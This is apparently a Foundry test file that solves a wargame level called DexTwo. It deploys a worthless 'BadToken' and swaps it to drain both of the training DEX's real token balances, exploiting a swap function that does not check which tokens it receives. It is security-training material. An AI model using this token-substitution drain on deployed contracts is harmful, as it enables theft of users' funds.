// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import {DexTwoFactory} from "src/levels/DexTwoFactory.sol";

interface IDexTwo {
    function token1() external view returns (address);

    function token2() external view returns (address);

    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    // function approve(address spender, uint256 amount) external;

    function balanceOf(address token, address account)
        external
        view
        returns (uint256);
}

contract BadToken is ERC20 {
    constructor(
        string memory name,
        string memory symbol,
        uint256 initialSupply
    ) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
    }
}

contract DexTwoTest is Test {
    DexTwoFactory level;
    IDexTwo target;
    address token1;
    address token2;
    address player;

    function setUp() public {
        // ----------------------------------
        // Create level instance
        // ----------------------------------
        level = new DexTwoFactory();
        player = makeAddr("PLAYER");
        target = IDexTwo(level.createInstance(player));
        token1 = target.token1();
        token2 = target.token2();
    }

    function test_DexTwo() public {
        // ----------------------------------
        // Initiate attack
        // ----------------------------------
        vm.startPrank(player);

        BadToken badToken = new BadToken("Bad token", "BT", 4);
        badToken.approve(address(target), 3);
        logBalance();

        badToken.transfer(address(target), 1);
        target.swap(address(badToken), token1, 1);
        logBalance();

        target.swap(address(badToken), token2, 2);
        logBalance();

        vm.stopPrank();

        // ----------------------------------
        // Validate
        // ----------------------------------
        bool success = level.validateInstance(payable(address(target)), player);
        assertEq(success, true);
    }

    function logBalance() internal view {
        console.log(
            "[PLAYER] Token1: %d, Token2: %d",
            target.balanceOf(token1, player),
            target.balanceOf(token2, player)
        );
        console.log(
            "[DEX] Token1: %d, Token2: %d\n",
            target.balanceOf(token1, address(target)),
            target.balanceOf(token2, address(target))
        );
    }
}
